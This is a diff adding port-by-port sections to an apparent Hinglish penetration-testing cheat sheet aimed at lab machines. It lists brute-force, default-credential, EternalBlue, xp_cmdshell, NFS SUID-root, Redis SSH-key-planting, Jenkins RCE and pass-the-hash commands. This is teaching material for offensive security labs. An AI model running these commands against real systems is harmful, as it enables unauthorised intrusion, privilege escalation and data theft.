+    <div class="tip2"><b>💡 SSH Tips:</b><br>
+    • Default creds try: root:root, admin:admin, root:toor<br>
+    • Old SSH version → searchsploit mein dhundho<br>
+    • SSH key found? <code>ssh2john id_rsa > hash.txt</code> → john se crack karo</div>
+  </div>
+</div>
+
+<!-- Telnet 23 -->
+<div class="tool-card">
+  <div class="tool-header">
+    <div class="tool-icon">💻</div>
+    <div><div class="tool-name">Port 23 — Telnet</div></div>
+    <div class="tool-sub"><span class="badge b-r">Unencrypted!</span></div>
+  </div>
+  <div class="tool-body">
+    <div class="what"><b>Pehle kya check karo</b>Telnet = unencrypted SSH. Seedha connect karo aur default creds try karo. Wireshark se credentials sniff bhi ho sakte hain!</div>
+    <div class="cmd"><div class="cmd-line">telnet <span class="arg">TARGET_IP</span> 23</div><div class="cmd-desc">Direct connect — banner dekho aur creds try karo</div></div>
+    <div class="cmd"><div class="cmd-line">nmap <span class="fl">-sV -p23 --script telnet-ntlm-info,telnet-encryption</span> <span class="arg">TARGET_IP</span></div><div class="cmd-desc">Telnet enumeration NSE script</div></div>
+    <div class="cmd"><div class="cmd-line">hydra <span class="fl">-l</span> <span class="arg">admin</span> <span class="fl">-P</span> <span class="arg">rockyou.txt</span> telnet://<span class="arg">TARGET_IP</span></div><div class="cmd-desc">Brute force</div></div>
+    <div class="tip2"><b>💡 Default Creds:</b> admin:admin, root:root, cisco:cisco, admin: (blank)</div>
+  </div>
+</div>
+
+<!-- SMTP 25 -->
+<div class="tool-card">
+  <div class="tool-header">
+    <div class="tool-icon">📧</div>
+    <div><div class="tool-name">Port 25 / 587 — SMTP (Email)</div></div>
+    <div class="tool-sub"><span class="badge b-y">User Enum</span></div>
+  </div>
+  <div class="tool-body">
+    <div class="what"><b>Pehle kya check karo</b>SMTP se valid usernames enumerate karo (VRFY/RCPT TO commands) — phir SSH/FTP pe woh usernames try karo!</div>
+    <div class="cmd-label">User Enumeration</div>
+    <div class="cmd"><div class="cmd-line">smtp-user-enum <span class="fl">-M VRFY -U</span> <span class="arg">users.txt</span> <span class="fl">-t</span> <span class="arg">TARGET_IP</span></div><div class="cmd-desc">Valid users dhundho SMTP se</div></div>
+    <div class="cmd"><div class="cmd-line">nmap <span class="fl">-p25 --script smtp-enum-users,smtp-open-relay</span> <span class="arg">TARGET_IP</span></div><div class="cmd-desc">NSE se user enum + open relay check</div></div>
+    <div class="cmd-label">Manual</div>
+    <div class="cmd"><div class="cmd-line">nc <span class="arg">TARGET_IP</span> 25<br>HELO test<br>VRFY root<br>VRFY admin</div><div class="cmd-desc">Manual user verify — "250" aaya = user exist karta hai</div></div>
+  </div>
+</div>
+
+<!-- DNS 53 -->
+<div class="tool-card">
+  <div class="tool-header">
+    <div class="tool-icon">🌍</div>
+    <div><div class="tool-name">Port 53 — DNS</div></div>
+    <div class="tool-sub"><span class="badge b-b">Zone Transfer</span><span class="badge b-g">Subdomain</span></div>
+  </div>
+  <div class="tool-body">
+    <div class="what"><b>Pehle kya check karo</b>Zone transfer try karo — agar misconfigured hai toh POORI DNS info mil jaayegi. Subdomains dhundho!</div>
+    <div class="cmd-label">Zone Transfer (Gold!)</div>
+    <div class="cmd"><div class="cmd-line">dig axfr @<span class="arg">TARGET_IP</span> <span class="arg">domain.htb</span></div><div class="cmd-desc">Zone transfer — success hua toh sab subdomains/IPs milenge!</div></div>
+    <div class="cmd"><div class="cmd-line">host <span class="fl">-l</span> <span class="arg">domain.htb</span> <span class="arg">TARGET_IP</span></div><div class="cmd-desc">Alternate zone transfer</div></div>
+    <div class="cmd-label">Subdomain Bruteforce</div>
+    <div class="cmd"><div class="cmd-line">gobuster dns <span class="fl">-d</span> <span class="arg">domain.htb</span> <span class="fl">-w</span> <span class="arg">/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt</span> <span class="fl">-r</span> <span class="arg">TARGET_IP</span></div><div class="cmd-desc">Subdomain brute force</div></div>
+    <div class="cmd"><div class="cmd-line">nmap <span class="fl">-p53 --script dns-zone-transfer,dns-brute</span> <span class="arg">TARGET_IP</span></div><div class="cmd-desc">NSE scripts</div></div>
+    <div class="tip2"><b>💡 /etc/hosts mein add karo:</b> <code>echo "TARGET_IP domain.htb" >> /etc/hosts</code></div>
+  </div>
+</div>
+
+<!-- HTTP 80/443 -->
+<div class="tool-card">
+  <div class="tool-header">
+    <div class="tool-icon">🌐</div>
+    <div><div class="tool-name">Port 80 / 443 — HTTP / HTTPS</div></div>
+    <div class="tool-sub"><span class="badge b-g">Web</span><span class="badge b-r">Most Common!</span></div>
+  </div>
+  <div class="tool-body">
+    <div class="what"><b>Pehle kya check karo</b>Web service = sabse zyada attack surface! Dir busting, technology fingerprint, known CVEs, login pages, LFI/RFI, SQLi sab check karo.</div>
+    <div class="cmd-label">Step 1 — Fingerprint</div>
+    <div class="cmd"><div class="cmd-line">whatweb http://<span class="arg">TARGET_IP</span></div><div class="cmd-desc">Technology stack pata karo (CMS, framework, version)</div></div>
+    <div class="cmd"><div class="cmd-line">curl <span class="fl">-I</span> http://<span class="arg">TARGET_IP</span></div><div class="cmd-desc">Headers dekho — version info leak hota hai</div></div>
+    <div class="cmd-label">Step 2 — Directory Busting</div>
+    <div class="cmd"><div class="cmd-line">gobuster dir <span class="fl">-u</span> http://<span class="arg">TARGET_IP</span> <span class="fl">-w</span> <span class="arg">/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span> <span class="fl">-x php,html,txt,bak</span></div><div class="cmd-desc">Hidden directories + files dhundho</div></div>
+    <div class="cmd"><div class="cmd-line">ffuf <span class="fl">-u</span> http://<span class="arg">TARGET_IP</span>/FUZZ <span class="fl">-w</span> <span class="arg">/usr/share/seclists/Discovery/Web-Content/common.txt</span></div><div class="cmd-desc">FFUF se fast fuzzing</div></div>
+    <div class="cmd-label">Step 3 — Vuln Scan</div>
+    <div class="cmd"><div class="cmd-line">nikto <span class="fl">-h</span> http://<span class="arg">TARGET_IP</span></div><div class="cmd-desc">Common web vulnerabilities auto scan</div></div>
+    <div class="cmd-label">WordPress detected?</div>
+    <div class="cmd"><div class="cmd-line">wpscan <span class="fl">--url</span> http://<span class="arg">TARGET_IP</span> <span class="fl">--enumerate u,p,t</span></div><div class="cmd-desc">WP users, plugins, themes enum</div></div>
+    <div class="tip2"><b>💡 Check karo:</b> robots.txt, sitemap.xml, /.git/, /backup/, /admin/, /login/, /.env</div>
+  </div>
+</div>
+
+<!-- SNMP 161 -->
+<div class="tool-card">
+  <div class="tool-header">
+    <div class="tool-icon">📡</div>
+    <div><div class="tool-name">Port 161 (UDP) — SNMP</div></div>
+    <div class="tool-sub"><span class="badge b-y">Info Leak!</span></div>
+  </div>
+  <div class="tool-body">
+    <div class="what"><b>Pehle kya check karo</b>SNMP community string "public" try karo — zyada tar misconfigured hoti hai. System users, processes, network info sab leak hota hai!</div>
+    <div class="cmd"><div class="cmd-line">snmpwalk <span class="fl">-c public -v1</span> <span class="arg">TARGET_IP</span></div><div class="cmd-desc">Full SNMP walk — sab info dump karo</div></div>
+    <div class="cmd"><div class="cmd-line">snmp-check <span class="arg">TARGET_IP</span> <span class="fl">-c public</span></div><div class="cmd-desc">Friendly output mein SNMP info</div></div>
+    <div class="cmd"><div class="cmd-line">onesixtyone <span class="fl">-c</span> <span class="arg">community.txt</span> <span class="arg">TARGET_IP</span></div><div class="cmd-desc">Community string brute force</div></div>
+    <div class="cmd"><div class="cmd-line">nmap <span class="fl">-sU -p161 --script snmp-info,snmp-processes,snmp-win32-users</span> <span class="arg">TARGET_IP</span></div><div class="cmd-desc">NSE se detailed SNMP enum</div></div>
+    <div class="tip2"><b>💡 Community strings try karo:</b> public, private, community, manager, secret</div>
+  </div>
+</div>
+
+<!-- SMB 139/445 -->
+<div class="tool-card">
+  <div class="tool-header">
+    <div class="tool-icon">📂</div>
+    <div><div class="tool-name">Port 139 / 445 — SMB (Windows Shares)</div></div>
+    <div class="tool-sub"><span class="badge b-b">Windows</span><span class="badge b-r">EternalBlue?</span></div>
+  </div>
+  <div class="tool-body">
+    <div class="what"><b>Pehle kya check karo</b>Null session + anonymous share access try karo, version check karo (EternalBlue!), users enumerate karo.</div>
+    <div class="cmd-label">Step 1 — Quick Enum</div>
+    <div class="cmd"><div class="cmd-line">enum4linux <span class="fl">-a</span> <span class="arg">TARGET_IP</span></div><div class="cmd-desc">Full SMB enumeration — users, shares, groups sab</div></div>
+    <div class="cmd"><div class="cmd-line">smbclient <span class="fl">-L //</span><span class="arg">TARGET_IP</span><span class="fl">/</span> <span class="fl">-N</span></div><div class="cmd-desc">Shares list karo — null session</div></div>
+    <div class="cmd-label">Step 2 — Share Access</div>
+    <div class="cmd"><div class="cmd-line">smbclient //<span class="arg">TARGET_IP</span>/<span class="arg">ShareName</span> <span class="fl">-N</span></div><div class="cmd-desc">Anonymous share connect karo</div></div>
+    <div class="cmd"><div class="cmd-line">crackmapexec smb <span class="arg">TARGET_IP</span> <span class="fl">-u</span> '' <span class="fl">-p</span> '' <span class="fl">--shares</span></div><div class="cmd-desc">CME se null session shares</div></div>
+    <div class="cmd-label">Step 3 — EternalBlue Check (MS17-010)</div>
+    <div class="cmd"><div class="cmd-line">nmap <span class="fl">-p445 --script smb-vuln-ms17-010</span> <span class="arg">TARGET_IP</span></div><div class="cmd-desc">EternalBlue vulnerable hai? → Metasploit use karo!</div></div>
+    <div class="cmd"><div class="cmd-line">use exploit/windows/smb/ms17_010_eternalblue<br>set RHOSTS <span class="arg">TARGET_IP</span><br>run</div><div class="cmd-desc">MSF se EternalBlue exploit</div></div>
+  </div>
+</div>
+
+<!-- LDAP 389 -->
+<div class="tool-card">
+  <div class="tool-header">
+    <div class="tool-icon">🏰</div>
+    <div><div class="tool-name">Port 389 / 636 — LDAP (Active Directory)</div></div>
+    <div class="tool-sub"><span class="badge b-b">Windows AD</span></div>
+  </div>
+  <div class="tool-body">
+    <div class="what"><b>Pehle kya check karo</b>Anonymous LDAP bind try karo — AD users, groups, computers sab nikal sakte ho! Domain enum ke liye gold mine.</div>
+    <div class="cmd"><div class="cmd-line">ldapsearch <span class="fl">-x -H</span> ldap://<span class="arg">TARGET_IP</span> <span class="fl">-b "DC=domain,DC=htb"</span></div><div class="cmd-desc">Anonymous LDAP bind + full dump</div></div>
+    <div class="cmd"><div class="cmd-line">ldapsearch <span class="fl">-x -H</span> ldap://<span class="arg">TARGET_IP</span> <span class="fl">-b "DC=domain,DC=htb" "(objectClass=user)" sAMAccountName</span></div><div class="cmd-desc">Sirf usernames nikaalo</div></div>
+    <div class="cmd"><div class="cmd-line">nmap <span class="fl">-p389 --script ldap-rootdse,ldap-search</span> <span class="arg">TARGET_IP</span></div><div class="cmd-desc">NSE LDAP enum</div></div>
+    <div class="tip2"><b>💡 Anonymous bind success?</b> Woh usernames nikaal ke ASREPRoasting try karo!</div>
+  </div>
+</div>
+
+<!-- MSSQL 1433 -->
+<div class="tool-card">
+  <div class="tool-header">
+    <div class="tool-icon">🗄️</div>
+    <div><div class="tool-name">Port 1433 — MSSQL (Microsoft SQL Server)</div></div>
+    <div class="tool-sub"><span class="badge b-b">Windows</span><span class="badge b-r">RCE possible!</span></div>
+  </div>
+  <div class="tool-body">
+    <div class="what"><b>Pehle kya check karo</b>Default creds try karo (sa:sa, sa:blank), xp_cmdshell enable karo → RCE!</div>
+    <div class="cmd"><div class="cmd-line">nmap <span class="fl">-p1433 --script ms-sql-info,ms-sql-config,ms-sql-empty-password</span> <span class="arg">TARGET_IP</span></div><div class="cmd-desc">MSSQL info + empty password check</div></div>
+    <div class="cmd"><div class="cmd-line">impacket-mssqlclient <span class="arg">sa</span>:<span class="arg">sa</span>@<span class="arg">TARGET_IP</span></div><div class="cmd-desc">Default creds se connect</div></div>
+    <div class="cmd"><div class="cmd-line">crackmapexec mssql <span class="arg">TARGET_IP</span> <span class="fl">-u</span> <span class="arg">sa</span> <span class="fl">-p</span> <span class="arg">sa</span> <span class="fl">-x</span> <span class="arg">"whoami"</span></div><div class="cmd-desc">CME se command execute</div></div>
+    <div class="cmd"><div class="cmd-line">EXEC sp_configure 'show advanced options', 1;<br>EXEC sp_configure 'xp_cmdshell', 1;<br>EXEC xp_cmdshell 'whoami';</div><div class="cmd-desc">xp_cmdshell enable karo → OS command execute!</div></div>
+    <div class="tip2"><b>💡 Default Creds:</b> sa:sa, sa: (blank), sa:Password1, sa:Admin@123</div>
+  </div>
+</div>
+
+<!-- NFS 2049 -->
+<div class="tool-card">
+  <div class="tool-header">
+    <div class="tool-icon">📤</div>
+    <div><div class="tool-name">Port 2049 — NFS (Network File Share)</div></div>
+    <div class="tool-sub"><span class="badge b-g">Linux</span><span class="badge b-y">Mount!</span></div>
+  </div>
+  <div class="tool-body">
+    <div class="what"><b>Pehle kya check karo</b>NFS shares list karo — agar "no_root_squash" hai toh root ke rights se files likh sakte ho!</div>
+    <div class="cmd"><div class="cmd-line">showmount <span class="fl">-e</span> <span class="arg">TARGET_IP</span></div><div class="cmd-desc">Available NFS exports dekho</div></div>
+    <div class="cmd"><div class="cmd-line">mkdir /tmp/nfs<br>mount <span class="fl">-t nfs</span> <span class="arg">TARGET_IP</span>:/<span class="arg">share</span> /tmp/nfs</div><div class="cmd-desc">NFS share mount karo</div></div>
+    <div class="cmd"><div class="cmd-line">nmap <span class="fl">-p2049 --script nfs-showmount,nfs-ls,nfs-statfs</span> <span class="arg">TARGET_IP</span></div><div class="cmd-desc">NSE NFS enum</div></div>
+    <div class="tip2"><b>💡 no_root_squash?</b> SUID bash copy karo share mein: <code>cp /bin/bash /tmp/nfs/; chmod +s /tmp/nfs/bash</code> → victim pe <code>/tmp/bash -p</code> → root!</div>
+  </div>
+</div>
+
+<!-- MySQL 3306 -->
+<div class="tool-card">
+  <div class="tool-header">
+    <div class="tool-icon">🐬</div>
+    <div><div class="tool-name">Port 3306 — MySQL</div></div>
+    <div class="tool-sub"><span class="badge b-g">Linux</span><span class="badge b-b">Windows</span></div>
+  </div>
+  <div class="tool-body">
+    <div class="what"><b>Pehle kya check karo</b>Default creds try karo, databases dump karo, hashes nikalo aur crack karo!</div>
+    <div class="cmd"><div class="cmd-line">mysql <span class="fl">-u root -p</span> <span class="fl">-h</span> <span class="arg">TARGET_IP</span></div><div class="cmd-desc">Connect karo (root:root, root:blank try karo)</div></div>
+    <div class="cmd"><div class="cmd-line">nmap <span class="fl">-p3306 --script mysql-info,mysql-empty-password,mysql-databases</span> <span class="arg">TARGET_IP</span></div><div class="cmd-desc">NSE MySQL enum</div></div>
+    <div class="cmd"><div class="cmd-line"><span class="arg"># Andar aane ke baad:</span><br>show databases;<br>use <span class="arg">dbname</span>;<br>show tables;<br>select * from users;<br>select user,password from mysql.user;</div><div class="cmd-desc">Database enumerate karo, hashes nikalo</div></div>
+    <div class="tip2"><b>💡 Default Creds:</b> root: (blank), root:root, root:mysql, root:toor</div>
+  </div>
+</div>
+
+<!-- RDP 3389 -->
+<div class="tool-card">
+  <div class="tool-header">
+    <div class="tool-icon">🖥️</div>
+    <div><div class="tool-name">Port 3389 — RDP (Remote Desktop)</div></div>
+    <div class="tool-sub"><span class="badge b-b">Windows</span></div>
+  </div>
+  <div class="tool-body">
+    <div class="what"><b>Pehle kya check karo</b>Valid creds mile hain? RDP se GUI access! BlueKeep (CVE-2019-0708) check karo older Windows pe.</div>
+    <div class="cmd"><div class="cmd-line">xfreerdp <span class="fl">/u:</span><span class="arg">Administrator</span> <span class="fl">/p:</span><span class="arg">Password123</span> <span class="fl">/v:</span><span class="arg">TARGET_IP</span></div><div class="cmd-desc">RDP GUI login</div></div>
+    <div class="cmd"><div class="cmd-line">rdesktop <span class="arg">TARGET_IP</span> <span class="fl">-u</span> <span class="arg">admin</span> <span class="fl">-p</span> <span class="arg">password</span></div><div class="cmd-desc">Alternate RDP client</div></div>
+    <div class="cmd"><div class="cmd-line">nmap <span class="fl">-p3389 --script rdp-vuln-ms12-020,rdp-enum-encryption</span> <span class="arg">TARGET_IP</span></div><div class="cmd-desc">BlueKeep + MS12-020 vuln check</div></div>
+    <div class="cmd"><div class="cmd-line">hydra <span class="fl">-l</span> <span class="arg">Administrator</span> <span class="fl">-P</span> <span class="arg">rockyou.txt</span> rdp://<span class="arg">TARGET_IP</span> <span class="fl">-t 1</span></div><div class="cmd-desc">RDP brute force (slow karo, lockout risk!)</div></div>
+  </div>
+</div>
+
+<!-- WinRM 5985 -->
+<div class="tool-card">
+  <div class="tool-header">
+    <div class="tool-icon">⚡</div>
+    <div><div class="tool-name">Port 5985 / 5986 — WinRM</div></div>
+    <div class="tool-sub"><span class="badge b-b">Windows</span><span class="badge b-g">Shell!</span></div>
+  </div>
+  <div class="tool-body">
+    <div class="what"><b>Pehle kya check karo</b>Credentials mile hain? evil-winrm se seedha shell lo! WinRM = Windows ka SSH equivalent.</div>
+    <div class="cmd"><div class="cmd-line">evil-winrm <span class="fl">-i</span> <span class="arg">TARGET_IP</span> <span class="fl">-u</span> <span class="arg">username</span> <span class="fl">-p</span> <span class="arg">password</span></div><div class="cmd-desc">Password se WinRM shell</div></div>
+    <div class="cmd"><div class="cmd-line">evil-winrm <span class="fl">-i</span> <span class="arg">TARGET_IP</span> <span class="fl">-u</span> <span class="arg">username</span> <span class="fl">-H</span> <span class="arg">NTLM_HASH</span></div><div class="cmd-desc">Pass-the-Hash se login (password nahi chahiye!)</div></div>
+    <div class="cmd"><div class="cmd-line">crackmapexec winrm <span class="arg">TARGET_IP</span> <span class="fl">-u</span> <span class="arg">user</span> <span class="fl">-p</span> <span class="arg">pass</span></div><div class="cmd-desc">WinRM creds validate karo</div></div>
+    <div class="tip2"><b>💡 5985 = HTTP, 5986 = HTTPS.</b> evil-winrm mein: upload/download files, PowerShell commands seedhe!</div>
+  </div>
+</div>
+
+<!-- Redis 6379 -->
+<div class="tool-card">
+  <div class="tool-header">
+    <div class="tool-icon">🔴</div>
+    <div><div class="tool-name">Port 6379 — Redis</div></div>
+    <div class="tool-sub"><span class="badge b-r">No Auth!</span><span class="badge b-g">RCE possible</span></div>
+  </div>
+  <div class="tool-body">
+    <div class="what"><b>Pehle kya check karo</b>Redis zyada tar bina authentication ke hota hai! Seedha connect karo → SSH key plant karo → system access!</div>
+    <div class="cmd"><div class="cmd-line">redis-cli <span class="fl">-h</span> <span class="arg">TARGET_IP</span></div><div class="cmd-desc">Connect karo — agar auth nahi toh seedha andar!</div></div>
+    <div class="cmd"><div class="cmd-line">redis-cli <span class="fl">-h</span> <span class="arg">TARGET_IP</span> info</div><div class="cmd-desc">Server info — version, config</div></div>
+    <div class="cmd"><div class="cmd-line"><span class="arg"># SSH Key plant karo (if redis runs as root)</span><br>redis-cli -h <span class="arg">TARGET_IP</span> config set dir /root/.ssh<br>redis-cli -h <span class="arg">TARGET_IP</span> config set dbfilename authorized_keys<br>redis-cli -h <span class="arg">TARGET_IP</span> set crackit "SSH_PUBLIC_KEY"<br>redis-cli -h <span class="arg">TARGET_IP</span> save</div><div class="cmd-desc">Teri SSH public key root ke authorized_keys mein daal do!</div></div>
+    <div class="tip2"><b>💡 Auth chahiye?</b> <code>redis-cli -h TARGET_IP AUTH password</code> — try: redis, blank, admin</div>
+  </div>
+</div>
+
+<!-- MongoDB 27017 -->
+<div class="tool-card">
+  <div class="tool-header">
+    <div class="tool-icon">🍃</div>
+    <div><div class="tool-name">Port 27017 — MongoDB</div></div>
+    <div class="tool-sub"><span class="badge b-r">No Auth!</span></div>
+  </div>
+  <div class="tool-body">
+    <div class="what"><b>Pehle kya check karo</b>MongoDB often bina auth ke exposed hota hai! Seedha connect karo, databases dump karo.</div>
+    <div class="cmd"><div class="cmd-line">mongo <span class="arg">TARGET_IP</span>:27017</div><div class="cmd-desc">Connect karo</div></div>
+    <div class="cmd"><div class="cmd-line">show dbs;<br>use <span class="arg">dbname</span>;<br>show collections;<br>db.<span class="arg">collection</span>.find();</div><div class="cmd-desc">Databases aur data dump</div></div>
+    <div class="cmd"><div class="cmd-line">nmap <span class="fl">-p27017 --script mongodb-info,mongodb-databases</span> <span class="arg">TARGET_IP</span></div><div class="cmd-desc">NSE MongoDB enum</div></div>
+  </div>
+</div>
+
+<!-- HTTP Alt 8080 -->
+<div class="tool-card">
+  <div class="tool-header">
+    <div class="tool-icon">🌐</div>
+    <div><div class="tool-name">Port 8080 / 8443 / 8000 — HTTP Alternate</div></div>
+    <div class="tool-sub"><span class="badge b-y">Admin Panel?</span></div>
+  </div>
+  <div class="tool-body">
+    <div class="what"><b>Pehle kya check karo</b>Yeh ports pe zyada tar admin panels, Jenkins, Tomcat, Jupyter, dev servers hote hain!</div>
+    <div class="cmd"><div class="cmd-line">curl <span class="fl">-I</span> http://<span class="arg">TARGET_IP</span>:8080</div><div class="cmd-desc">Banner grab karo</div></div>
+    <div class="cmd"><div class="cmd-line">gobuster dir <span class="fl">-u</span> http://<span class="arg">TARGET_IP</span>:8080 <span class="fl">-w</span> <span class="arg">/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span></div><div class="cmd-desc">Dir bust karo</div></div>
+    <div class="tip2"><b>💡 Common Services on Alt HTTP Ports:</b><br>
+    • Jenkins (8080) → Script Console → RCE! <code>cmd = "id".execute()</code><br>
+    • Tomcat (8080/8443) → /manager → default creds: tomcat:tomcat, admin:admin<br>
+    • Jupyter (8888) → Terminal → OS access<br>
+    • Grafana (3000) → CVE-2021-43798 directory traversal</div>
+  </div>
+</div>
+
+<!-- Port Reference Table -->
+<div class="tool-card">
+  <div class="tool-header">
+    <div class="tool-icon">📋</div>
+    <div><div class="tool-name">Quick Port → Attack Reference Table</div></div>
+  </div>
+  <div class="tool-body" style="overflow-x:auto;-webkit-overflow-scrolling:touch">
+    <table style="width:100%;border-collapse:collapse;font-size:12px;min-width:600px">
+      <tr style="background:rgba(0,255,136,0.1);color:#00ff88">
+        <th style="padding:7px;border:1px solid #30363d;text-align:left">Port</th>
+        <th style="padding:7px;border:1px solid #30363d;text-align:left">Service</th>
+        <th style="padding:7px;border:1px solid #30363d;text-align:left">Pehla Move</th>
+        <th style="padding:7px;border:1px solid #30363d;text-align:left">Tool</th>
+        <th style="padding:7px;border:1px solid #30363d;text-align:left">Common Vuln</th>
+      </tr>
+      <tr style="border:1px solid #30363d"><td style="padding:6px;border:1px solid #30363d;color:#f0883e">21</td><td style="padding:6px;border:1px solid #30363d">FTP</td><td style="padding:6px;border:1px solid #30363d">Anonymous login</td><td style="padding:6px;border:1px solid #30363d;color:#7ee787">ftp, hydra, nmap</td><td style="padding:6px;border:1px solid #30363d">vsftpd backdoor, weak creds</td></tr>
+      <tr style="background:#161b22;border:1px solid #30363d"><td style="padding:6px;border:1px solid #30363d;color:#f0883e">22</td><td style="padding:6px;border:1px solid #30363d">SSH</td><td style="padding:6px;border:1px solid #30363d">Version + id_rsa hunt</td><td style="padding:6px;border:1px solid #30363d;color:#7ee787">ssh, hydra</td><td style="padding:6px;border:1px solid #30363d">Weak creds, exposed key</td></tr>
+      <tr style="border:1px solid #30363d"><td style="padding:6px;border:1px solid #30363d;color:#f0883e">23</td><td style="padding:6px;border:1px solid #30363d">Telnet</td><td style="padding:6px;border:1px solid #30363d">Direct connect</td><td style="padding:6px;border:1px solid #30363d;color:#7ee787">telnet, hydra</td><td style="padding:6px;border:1px solid #30363d">Plain text, weak creds</td></tr>
+      <tr style="background:#161b22"><td style="padding:6px;border:1px solid #30363d;color:#f0883e">25</td><td style="padding:6px;border:1px solid #30363d">SMTP</td><td style="padding:6px;border:1px solid #30363d">User enum VRFY</td><td style="padding:6px;border:1px solid #30363d;color:#7ee787">smtp-user-enum, nmap</td><td style="padding:6px;border:1px solid #30363d">Open relay, user enum</td></tr>
+      <tr><td style="padding:6px;border:1px solid #30363d;color:#f0883e">53</td><td style="padding:6px;border:1px solid #30363d">DNS</td><td style="padding:6px;border:1px solid #30363d">Zone transfer</td><td style="padding:6px;border:1px solid #30363d;color:#7ee787">dig, gobuster dns</td><td style="padding:6px;border:1px solid #30363d">Zone transfer, subdomain enum</td></tr>
+      <tr style="background:#161b22"><td style="padding:6px;border:1px solid #30363d;color:#f0883e">80/443</td><td style="padding:6px;border:1px solid #30363d">HTTP/S</td><td style="padding:6px;border:1px solid #30363d">Dir bust + nikto</td><td style="padding:6px;border:1px solid #30363d;color:#7ee787">gobuster, nikto, ffuf</td><td style="padding:6px;border:1px solid #30363d">SQLi, LFI, RFI, RCE</td></tr>
+      <tr><td style="padding:6px;border:1px solid #30363d;color:#f0883e">111</td><td style="padding:6px;border:1px solid #30363d">RPCBind</td><td style="padding:6px;border:1px solid #30363d">rpcinfo -p</td><td style="padding:6px;border:1px solid #30363d;color:#7ee787">rpcinfo, nmap</td><td style="padding:6px;border:1px solid #30363d">NFS leak via RPC</td></tr>
+      <tr style="background:#161b22"><td style="padding:6px;border:1px solid #30363d;color:#f0883e">135</td><td style="padding:6px;border:1px solid #30363d">MSRPC</td><td style="padding:6px;border:1px solid #30363d">nmap NSE scripts</td><td style="padding:6px;border:1px solid #30363d;color:#7ee787">nmap, impacket</td><td style="padding:6px;border:1px solid #30363d">Endpoint mapper enum</td></tr>
+      <tr><td style="padding:6px;border:1px solid #30363d;color:#f0883e">139/445</td><td style="padding:6px;border:1px solid #30363d">SMB</td><td style="padding:6px;border:1px solid #30363d">enum4linux + EternalBlue</td><td style="padding:6px;border:1px solid #30363d;color:#7ee787">enum4linux, crackmapexec</td><td style="padding:6px;border:1px solid #30363d">MS17-010, null session</td></tr>
+      <tr style="background:#161b22"><td style="padding:6px;border:1px solid #30363d;color:#f0883e">161</td><td style="padding:6px;border:1px solid #30363d">SNMP</td><td style="padding:6px;border:1px solid #30363d">snmpwalk public</td><td style="padding:6px;border:1px solid #30363d;color:#7ee787">snmpwalk, onesixtyone</td><td style="padding:6px;border:1px solid #30363d">Default community, info leak</td></tr>
+      <tr><td style="padding:6px;border:1px solid #30363d;color:#f0883e">389/636</td><td style="padding:6px;border:1px solid #30363d">LDAP</td><td style="padding:6px;border:1px solid #30363d">Anonymous bind</td><td style="padding:6px;border:1px solid #30363d;color:#7ee787">ldapsearch, nmap</td><td style="padding:6px;border:1px solid #30363d">Anon bind, AD user dump</td></tr>
+      <tr style="background:#161b22"><td style="padding:6px;border:1px solid #30363d;color:#f0883e">1433</td><td style="padding:6px;border:1px solid #30363d">MSSQL</td><td style="padding:6px;border:1px solid #30363d">Default creds sa:sa</td><td style="padding:6px;border:1px solid #30363d;color:#7ee787">impacket-mssqlclient, cme</td><td style="padding:6px;border:1px solid #30363d">xp_cmdshell RCE</td></tr>
+      <tr><td style="padding:6px;border:1px solid #30363d;color:#f0883e">2049</td><td style="padding:6px;border:1px solid #30363d">NFS</td><td style="padding:6px;border:1px solid #30363d">showmount -e</td><td style="padding:6px;border:1px solid #30363d;color:#7ee787">showmount, mount</td><td style="padding:6px;border:1px solid #30363d">no_root_squash priv esc</td></tr>
+      <tr style="background:#161b22"><td style="padding:6px;border:1px solid #30363d;color:#f0883e">3306</td><td style="padding:6px;border:1px solid #30363d">MySQL</td><td style="padding:6px;border:1px solid #30363d">root:blank login</td><td style="padding:6px;border:1px solid #30363d;color:#7ee787">mysql, nmap</td><td style="padding:6px;border:1px solid #30363d">Weak creds, UDF injection</td></tr>
+      <tr><td style="padding:6px;border:1px solid #30363d;color:#f0883e">3389</td><td style="padding:6px;border:1px solid #30363d">RDP</td><td style="padding:6px;border:1px solid #30363d">xfreerdp login</td><td style="padding:6px;border:1px solid #30363d;color:#7ee787">xfreerdp, hydra</td><td style="padding:6px;border:1px solid #30363d">BlueKeep CVE-2019-0708</td></tr>
+      <tr style="background:#161b22"><td style="padding:6px;border:1px solid #30363d;color:#f0883e">5985</td><td style="padding:6px;border:1px solid #30363d">WinRM</td><td style="padding:6px;border:1px solid #30363d">evil-winrm shell</td><td style="padding:6px;border:1px solid #30363d;color:#7ee787">evil-winrm, crackmapexec</td><td style="padding:6px;border:1px solid #30363d">Pass-the-Hash</td></tr>
+      <tr><td style="padding:6px;border:1px solid #30363d;color:#f0883e">6379</td><td style="padding:6px;border:1px solid #30363d">Redis</td><td style="padding:6px;border:1px solid #30363d">redis-cli no auth</td><td style="padding:6px;border:1px solid #30363d;color:#7ee787">redis-cli</td><td style="padding:6px;border:1px solid #30363d">No auth, SSH key write</td></tr>
+      <tr style="background:#161b22"><td style="padding:6px;border:1px solid #30363d;color:#f0883e">8080/8443</td><td style="padding:6px;border:1px solid #30363d">HTTP Alt</td><td style="padding:6px;border:1px solid #30363d">Browser + dir bust</td><td style="padding:6px;border:1px solid #30363d;color:#7ee787">gobuster, curl</td><td style="padding:6px;border:1px solid #30363d">Jenkins RCE, Tomcat mgr</td></tr>
+      <tr><td style="padding:6px;border:1px solid #30363d;color:#f0883e">27017</td><td style="padding:6px;border:1px solid #30363d">MongoDB</td><td style="padding:6px;border:1px solid #30363d">No auth connect</td><td style="padding:6px;border:1px solid #30363d;color:#7ee787">mongo, nmap</td><td style="padding:6px;border:1px solid #30363d">No auth, data exposure</td></tr>
+    </table>
+  </div>
+</div>
+
+</div><!-- ports -->
+
+<script>
+function show(id,btn){
+  document.querySelectorAll('.sheet').forEach(function(s){s.classList.remove('on')});
+  document.querySelectorAll('.tab').forEach(function(b){b.classList.remove('on')});
+  var el=document.getElementById('s-'+id);
+  if(el) el.classList.add('on');
+  if(btn) btn.classList.add('on');
+}
+window.onload=function(){show('recon',document.querySelector('.tab'))};
+</script>
+</body>
+</html>
